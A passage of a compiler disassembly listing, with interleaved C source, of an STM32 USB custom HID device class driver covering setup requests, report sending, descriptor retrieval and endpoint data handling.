 800883e:	4619      	mov	r1, r3
 8008840:	6878      	ldr	r0, [r7, #4]
 8008842:	f003 fcb7 	bl	800c1b4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008846:	e063      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008848:	6839      	ldr	r1, [r7, #0]
 800884a:	6878      	ldr	r0, [r7, #4]
 800884c:	f003 fc41 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008850:	2303      	movs	r3, #3
 8008852:	75fb      	strb	r3, [r7, #23]
          break;
 8008854:	e05c      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008856:	683b      	ldr	r3, [r7, #0]
 8008858:	885b      	ldrh	r3, [r3, #2]
 800885a:	0a1b      	lsrs	r3, r3, #8
 800885c:	b29b      	uxth	r3, r3
 800885e:	2b22      	cmp	r3, #34	; 0x22
 8008860:	d110      	bne.n	8008884 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008862:	683b      	ldr	r3, [r7, #0]
 8008864:	88db      	ldrh	r3, [r3, #6]
 8008866:	2b49      	cmp	r3, #73	; 0x49
 8008868:	bf28      	it	cs
 800886a:	2349      	movcs	r3, #73	; 0x49
 800886c:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 800886e:	687b      	ldr	r3, [r7, #4]
 8008870:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008874:	687a      	ldr	r2, [r7, #4]
 8008876:	33b0      	adds	r3, #176	; 0xb0
 8008878:	009b      	lsls	r3, r3, #2
 800887a:	4413      	add	r3, r2
 800887c:	685b      	ldr	r3, [r3, #4]
 800887e:	681b      	ldr	r3, [r3, #0]
 8008880:	61bb      	str	r3, [r7, #24]
 8008882:	e00d      	b.n	80088a0 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008884:	683b      	ldr	r3, [r7, #0]
 8008886:	885b      	ldrh	r3, [r3, #2]
 8008888:	0a1b      	lsrs	r3, r3, #8
 800888a:	b29b      	uxth	r3, r3
 800888c:	2b21      	cmp	r3, #33	; 0x21
 800888e:	d107      	bne.n	80088a0 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008890:	4b26      	ldr	r3, [pc, #152]	; (800892c <USBD_CUSTOM_HID_Setup+0x230>)
 8008892:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008894:	683b      	ldr	r3, [r7, #0]
 8008896:	88db      	ldrh	r3, [r3, #6]
 8008898:	2b09      	cmp	r3, #9
 800889a:	bf28      	it	cs
 800889c:	2309      	movcs	r3, #9
 800889e:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 80088a0:	8bfb      	ldrh	r3, [r7, #30]
 80088a2:	461a      	mov	r2, r3
 80088a4:	69b9      	ldr	r1, [r7, #24]
 80088a6:	6878      	ldr	r0, [r7, #4]
 80088a8:	f003 fc84 	bl	800c1b4 <USBD_CtlSendData>
          break;
 80088ac:	e030      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088ae:	687b      	ldr	r3, [r7, #4]
 80088b0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088b4:	b2db      	uxtb	r3, r3
 80088b6:	2b03      	cmp	r3, #3
 80088b8:	d107      	bne.n	80088ca <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 80088ba:	693b      	ldr	r3, [r7, #16]
 80088bc:	3318      	adds	r3, #24
 80088be:	2201      	movs	r2, #1
 80088c0:	4619      	mov	r1, r3
 80088c2:	6878      	ldr	r0, [r7, #4]
 80088c4:	f003 fc76 	bl	800c1b4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088c8:	e022      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088ca:	6839      	ldr	r1, [r7, #0]
 80088cc:	6878      	ldr	r0, [r7, #4]
 80088ce:	f003 fc00 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 80088d2:	2303      	movs	r3, #3
 80088d4:	75fb      	strb	r3, [r7, #23]
          break;
 80088d6:	e01b      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088d8:	687b      	ldr	r3, [r7, #4]
 80088da:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088de:	b2db      	uxtb	r3, r3
 80088e0:	2b03      	cmp	r3, #3
 80088e2:	d106      	bne.n	80088f2 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 80088e4:	683b      	ldr	r3, [r7, #0]
 80088e6:	885b      	ldrh	r3, [r3, #2]
 80088e8:	b2db      	uxtb	r3, r3
 80088ea:	461a      	mov	r2, r3
 80088ec:	693b      	ldr	r3, [r7, #16]
 80088ee:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088f0:	e00e      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088f2:	6839      	ldr	r1, [r7, #0]
 80088f4:	6878      	ldr	r0, [r7, #4]
 80088f6:	f003 fbec 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 80088fa:	2303      	movs	r3, #3
 80088fc:	75fb      	strb	r3, [r7, #23]
          break;
 80088fe:	e007      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008900:	6839      	ldr	r1, [r7, #0]
 8008902:	6878      	ldr	r0, [r7, #4]
 8008904:	f003 fbe5 	bl	800c0d2 <USBD_CtlError>
          ret = USBD_FAIL;
 8008908:	2303      	movs	r3, #3
 800890a:	75fb      	strb	r3, [r7, #23]
          break;
 800890c:	e000      	b.n	8008910 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 800890e:	bf00      	nop
      }
      break;
 8008910:	e006      	b.n	8008920 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008912:	6839      	ldr	r1, [r7, #0]
 8008914:	6878      	ldr	r0, [r7, #4]
 8008916:	f003 fbdc 	bl	800c0d2 <USBD_CtlError>
      ret = USBD_FAIL;
 800891a:	2303      	movs	r3, #3
 800891c:	75fb      	strb	r3, [r7, #23]
      break;
 800891e:	bf00      	nop
  }
  return (uint8_t)ret;
 8008920:	7dfb      	ldrb	r3, [r7, #23]
}
 8008922:	4618      	mov	r0, r3
 8008924:	3720      	adds	r7, #32
 8008926:	46bd      	mov	sp, r7
 8008928:	bd80      	pop	{r7, pc}
 800892a:	bf00      	nop
 800892c:	20000090 	.word	0x20000090

08008930 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008930:	b580      	push	{r7, lr}
 8008932:	b086      	sub	sp, #24
 8008934:	af00      	add	r7, sp, #0
 8008936:	60f8      	str	r0, [r7, #12]
 8008938:	60b9      	str	r1, [r7, #8]
 800893a:	4613      	mov	r3, r2
 800893c:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800893e:	68fb      	ldr	r3, [r7, #12]
 8008940:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008944:	68fb      	ldr	r3, [r7, #12]
 8008946:	32b0      	adds	r2, #176	; 0xb0
 8008948:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800894c:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 800894e:	697b      	ldr	r3, [r7, #20]
 8008950:	2b00      	cmp	r3, #0
 8008952:	d101      	bne.n	8008958 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008954:	2303      	movs	r3, #3
 8008956:	e019      	b.n	800898c <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008958:	68fb      	ldr	r3, [r7, #12]
 800895a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800895e:	b2db      	uxtb	r3, r3
 8008960:	2b03      	cmp	r3, #3
 8008962:	d112      	bne.n	800898a <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008964:	697b      	ldr	r3, [r7, #20]
 8008966:	f893 3020 	ldrb.w	r3, [r3, #32]
 800896a:	2b00      	cmp	r3, #0
 800896c:	d10b      	bne.n	8008986 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 800896e:	697b      	ldr	r3, [r7, #20]
 8008970:	2201      	movs	r2, #1
 8008972:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008976:	4b07      	ldr	r3, [pc, #28]	; (8008994 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008978:	7819      	ldrb	r1, [r3, #0]
 800897a:	88fb      	ldrh	r3, [r7, #6]
 800897c:	68ba      	ldr	r2, [r7, #8]
 800897e:	68f8      	ldr	r0, [r7, #12]
 8008980:	f004 f9ea 	bl	800cd58 <USBD_LL_Transmit>
 8008984:	e001      	b.n	800898a <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008986:	2301      	movs	r3, #1
 8008988:	e000      	b.n	800898c <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 800898a:	2300      	movs	r3, #0
}
 800898c:	4618      	mov	r0, r3
 800898e:	3718      	adds	r7, #24
 8008990:	46bd      	mov	sp, r7
 8008992:	bd80      	pop	{r7, pc}
 8008994:	200000a6 	.word	0x200000a6

08008998 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008998:	b580      	push	{r7, lr}
 800899a:	b084      	sub	sp, #16
 800899c:	af00      	add	r7, sp, #0
 800899e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 80089a0:	2181      	movs	r1, #129	; 0x81
 80089a2:	4815      	ldr	r0, [pc, #84]	; (80089f8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 80089a4:	f002 fd32 	bl	800b40c <USBD_GetEpDesc>
 80089a8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 80089aa:	2101      	movs	r1, #1
 80089ac:	4812      	ldr	r0, [pc, #72]	; (80089f8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 80089ae:	f002 fd2d 	bl	800b40c <USBD_GetEpDesc>
 80089b2:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80089b4:	68fb      	ldr	r3, [r7, #12]
 80089b6:	2b00      	cmp	r3, #0
 80089b8:	d009      	beq.n	80089ce <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 80089ba:	68fb      	ldr	r3, [r7, #12]
 80089bc:	2200      	movs	r2, #0
 80089be:	f042 0202 	orr.w	r2, r2, #2
 80089c2:	711a      	strb	r2, [r3, #4]
 80089c4:	2200      	movs	r2, #0
 80089c6:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 80089c8:	68fb      	ldr	r3, [r7, #12]
 80089ca:	2205      	movs	r2, #5
 80089cc:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 80089ce:	68bb      	ldr	r3, [r7, #8]
 80089d0:	2b00      	cmp	r3, #0
 80089d2:	d009      	beq.n	80089e8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 80089d4:	68bb      	ldr	r3, [r7, #8]
 80089d6:	2200      	movs	r2, #0
 80089d8:	f042 0202 	orr.w	r2, r2, #2
 80089dc:	711a      	strb	r2, [r3, #4]
 80089de:	2200      	movs	r2, #0
 80089e0:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 80089e2:	68bb      	ldr	r3, [r7, #8]
 80089e4:	2205      	movs	r2, #5
 80089e6:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 80089e8:	687b      	ldr	r3, [r7, #4]
 80089ea:	2229      	movs	r2, #41	; 0x29
 80089ec:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 80089ee:	4b02      	ldr	r3, [pc, #8]	; (80089f8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 80089f0:	4618      	mov	r0, r3
 80089f2:	3710      	adds	r7, #16
 80089f4:	46bd      	mov	sp, r7
 80089f6:	bd80      	pop	{r7, pc}
 80089f8:	20000064 	.word	0x20000064

080089fc <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 80089fc:	b580      	push	{r7, lr}
 80089fe:	b084      	sub	sp, #16
 8008a00:	af00      	add	r7, sp, #0
 8008a02:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a04:	2181      	movs	r1, #129	; 0x81
 8008a06:	4815      	ldr	r0, [pc, #84]	; (8008a5c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008a08:	f002 fd00 	bl	800b40c <USBD_GetEpDesc>
 8008a0c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a0e:	2101      	movs	r1, #1
 8008a10:	4812      	ldr	r0, [pc, #72]	; (8008a5c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008a12:	f002 fcfb 	bl	800b40c <USBD_GetEpDesc>
 8008a16:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a18:	68fb      	ldr	r3, [r7, #12]
 8008a1a:	2b00      	cmp	r3, #0
 8008a1c:	d009      	beq.n	8008a32 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a1e:	68fb      	ldr	r3, [r7, #12]
 8008a20:	2200      	movs	r2, #0
 8008a22:	f042 0202 	orr.w	r2, r2, #2
 8008a26:	711a      	strb	r2, [r3, #4]
 8008a28:	2200      	movs	r2, #0
 8008a2a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008a2c:	68fb      	ldr	r3, [r7, #12]
 8008a2e:	2205      	movs	r2, #5
 8008a30:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a32:	68bb      	ldr	r3, [r7, #8]
 8008a34:	2b00      	cmp	r3, #0
 8008a36:	d009      	beq.n	8008a4c <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a38:	68bb      	ldr	r3, [r7, #8]
 8008a3a:	2200      	movs	r2, #0
 8008a3c:	f042 0202 	orr.w	r2, r2, #2
 8008a40:	711a      	strb	r2, [r3, #4]
 8008a42:	2200      	movs	r2, #0
 8008a44:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008a46:	68bb      	ldr	r3, [r7, #8]
 8008a48:	2205      	movs	r2, #5
 8008a4a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008a4c:	687b      	ldr	r3, [r7, #4]
 8008a4e:	2229      	movs	r2, #41	; 0x29
 8008a50:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008a52:	4b02      	ldr	r3, [pc, #8]	; (8008a5c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008a54:	4618      	mov	r0, r3
 8008a56:	3710      	adds	r7, #16
 8008a58:	46bd      	mov	sp, r7
 8008a5a:	bd80      	pop	{r7, pc}
 8008a5c:	20000064 	.word	0x20000064

08008a60 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008a60:	b580      	push	{r7, lr}
 8008a62:	b084      	sub	sp, #16
 8008a64:	af00      	add	r7, sp, #0
 8008a66:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a68:	2181      	movs	r1, #129	; 0x81
 8008a6a:	4815      	ldr	r0, [pc, #84]	; (8008ac0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008a6c:	f002 fcce 	bl	800b40c <USBD_GetEpDesc>
 8008a70:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a72:	2101      	movs	r1, #1
 8008a74:	4812      	ldr	r0, [pc, #72]	; (8008ac0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008a76:	f002 fcc9 	bl	800b40c <USBD_GetEpDesc>
 8008a7a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a7c:	68fb      	ldr	r3, [r7, #12]
 8008a7e:	2b00      	cmp	r3, #0
 8008a80:	d009      	beq.n	8008a96 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a82:	68fb      	ldr	r3, [r7, #12]
 8008a84:	2200      	movs	r2, #0
 8008a86:	f042 0202 	orr.w	r2, r2, #2
 8008a8a:	711a      	strb	r2, [r3, #4]
 8008a8c:	2200      	movs	r2, #0
 8008a8e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a90:	68fb      	ldr	r3, [r7, #12]
 8008a92:	2205      	movs	r2, #5
 8008a94:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a96:	68bb      	ldr	r3, [r7, #8]
 8008a98:	2b00      	cmp	r3, #0
 8008a9a:	d009      	beq.n	8008ab0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a9c:	68bb      	ldr	r3, [r7, #8]
 8008a9e:	2200      	movs	r2, #0
 8008aa0:	f042 0202 	orr.w	r2, r2, #2
 8008aa4:	711a      	strb	r2, [r3, #4]
 8008aa6:	2200      	movs	r2, #0
 8008aa8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008aaa:	68bb      	ldr	r3, [r7, #8]
 8008aac:	2205      	movs	r2, #5
 8008aae:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008ab0:	687b      	ldr	r3, [r7, #4]
 8008ab2:	2229      	movs	r2, #41	; 0x29
 8008ab4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008ab6:	4b02      	ldr	r3, [pc, #8]	; (8008ac0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008ab8:	4618      	mov	r0, r3
 8008aba:	3710      	adds	r7, #16
 8008abc:	46bd      	mov	sp, r7
 8008abe:	bd80      	pop	{r7, pc}
 8008ac0:	20000064 	.word	0x20000064

08008ac4 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008ac4:	b480      	push	{r7}
 8008ac6:	b083      	sub	sp, #12
 8008ac8:	af00      	add	r7, sp, #0
 8008aca:	6078      	str	r0, [r7, #4]
 8008acc:	460b      	mov	r3, r1
 8008ace:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008ad0:	687b      	ldr	r3, [r7, #4]
 8008ad2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ad6:	687b      	ldr	r3, [r7, #4]
 8008ad8:	32b0      	adds	r2, #176	; 0xb0
 8008ada:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ade:	2200      	movs	r2, #0
 8008ae0:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008ae4:	2300      	movs	r3, #0
}
 8008ae6:	4618      	mov	r0, r3
 8008ae8:	370c      	adds	r7, #12
 8008aea:	46bd      	mov	sp, r7
 8008aec:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008af0:	4770      	bx	lr

08008af2 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008af2:	b580      	push	{r7, lr}
 8008af4:	b084      	sub	sp, #16
 8008af6:	af00      	add	r7, sp, #0
 8008af8:	6078      	str	r0, [r7, #4]
 8008afa:	460b      	mov	r3, r1
 8008afc:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008afe:	687b      	ldr	r3, [r7, #4]
 8008b00:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b04:	687b      	ldr	r3, [r7, #4]
 8008b06:	32b0      	adds	r2, #176	; 0xb0
 8008b08:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b0c:	2b00      	cmp	r3, #0
 8008b0e:	d101      	bne.n	8008b14 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008b10:	2303      	movs	r3, #3
 8008b12:	e017      	b.n	8008b44 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008b14:	687b      	ldr	r3, [r7, #4]
 8008b16:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b1a:	687b      	ldr	r3, [r7, #4]
 8008b1c:	32b0      	adds	r2, #176	; 0xb0
 8008b1e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b22:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008b24:	687b      	ldr	r3, [r7, #4]
 8008b26:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008b2a:	687a      	ldr	r2, [r7, #4]
 8008b2c:	33b0      	adds	r3, #176	; 0xb0
 8008b2e:	009b      	lsls	r3, r3, #2
 8008b30:	4413      	add	r3, r2
 8008b32:	685b      	ldr	r3, [r3, #4]
 8008b34:	68db      	ldr	r3, [r3, #12]
 8008b36:	68fa      	ldr	r2, [r7, #12]
 8008b38:	7810      	ldrb	r0, [r2, #0]
 8008b3a:	68fa      	ldr	r2, [r7, #12]
 8008b3c:	7852      	ldrb	r2, [r2, #1]
 8008b3e:	4611      	mov	r1, r2
 8008b40:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008b42:	2300      	movs	r3, #0
}
 8008b44:	4618      	mov	r0, r3
 8008b46:	3710      	adds	r7, #16
 8008b48:	46bd      	mov	sp, r7
 8008b4a:	bd80      	pop	{r7, pc}

08008b4c <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008b4c:	b580      	push	{r7, lr}
 8008b4e:	b084      	sub	sp, #16
 8008b50:	af00      	add	r7, sp, #0
 8008b52:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008b54:	687b      	ldr	r3, [r7, #4]
 8008b56:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b5a:	687b      	ldr	r3, [r7, #4]
 8008b5c:	32b0      	adds	r2, #176	; 0xb0
 8008b5e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b62:	2b00      	cmp	r3, #0
 8008b64:	d101      	bne.n	8008b6a <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008b66:	2303      	movs	r3, #3
 8008b68:	e01c      	b.n	8008ba4 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008b6a:	687b      	ldr	r3, [r7, #4]
 8008b6c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b70:	687b      	ldr	r3, [r7, #4]
 8008b72:	32b0      	adds	r2, #176	; 0xb0
 8008b74:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b78:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008b7a:	4b0c      	ldr	r3, [pc, #48]	; (8008bac <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008b7c:	7819      	ldrb	r1, [r3, #0]
 8008b7e:	68fa      	ldr	r2, [r7, #12]
 8008b80:	230f      	movs	r3, #15
 8008b82:	6878      	ldr	r0, [r7, #4]
 8008b84:	f004 f920 	bl	800cdc8 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008b88:	68fb      	ldr	r3, [r7, #12]
 8008b8a:	781a      	ldrb	r2, [r3, #0]
 8008b8c:	4b08      	ldr	r3, [pc, #32]	; (8008bb0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008b8e:	701a      	strb	r2, [r3, #0]
 8008b90:	4b07      	ldr	r3, [pc, #28]	; (8008bb0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
